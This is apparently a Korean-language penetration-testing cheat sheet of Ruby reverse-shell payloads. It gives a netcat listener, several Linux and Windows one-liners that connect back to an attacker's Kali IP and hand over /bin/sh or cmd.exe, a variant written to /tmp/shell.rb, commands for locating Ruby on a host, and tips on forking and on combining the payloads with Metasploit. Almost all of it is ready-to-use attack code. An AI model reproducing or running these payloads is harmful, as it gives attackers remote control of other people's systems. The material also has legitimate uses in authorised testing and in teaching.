# ruby

# 리버스쉘 — Ruby

---

## 리스너

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

---

## Linux

```bash
# 기본 (가장 보편적)
ruby -rsocket -e'f=TCPSocket.open("<칼리IP>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# bash 실행
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<칼리IP>","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Process.spawn 방식
ruby -rsocket -e 's=TCPSocket.new("<칼리IP>",4444);Process.spawn("/bin/sh",[:in,:out,:err]=>s)'

# 파일로 저장
cat > /tmp/shell.rb << 'EOF'
require 'socket'
s = TCPSocket.new('<칼리IP>', 4444)
exec "/bin/sh -i <&#{s.fileno} >&#{s.fileno} 2>&#{s.fileno}"
EOF
ruby /tmp/shell.rb
```

---

## Windows

```bash
ruby -rsocket -e 'c=TCPSocket.new("<칼리IP>",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

ruby -rsocket -e 'c=TCPSocket.new("<칼리IP>",4444);Process.spawn("cmd.exe",[:in,:out,:err]=>c)'
```

---

## 버전 및 경로 확인

```bash
which ruby
ruby --version
ls /usr/bin/ruby* 2>/dev/null
find / -name ruby -type f 2>/dev/null
```

---

## 팁

- Ruby는 많은 Unix 시스템에 설치되어 있음 (특히 macOS, Rails 서버)
- `/bin/sh` 없으면 `/bin/bash` 또는 `/bin/dash` 로 변경
- `fork` 사용 시 부모 프로세스와 분리되어 더 안정적
- Metasploit의 Ruby 기반 페이로드와 조합 가능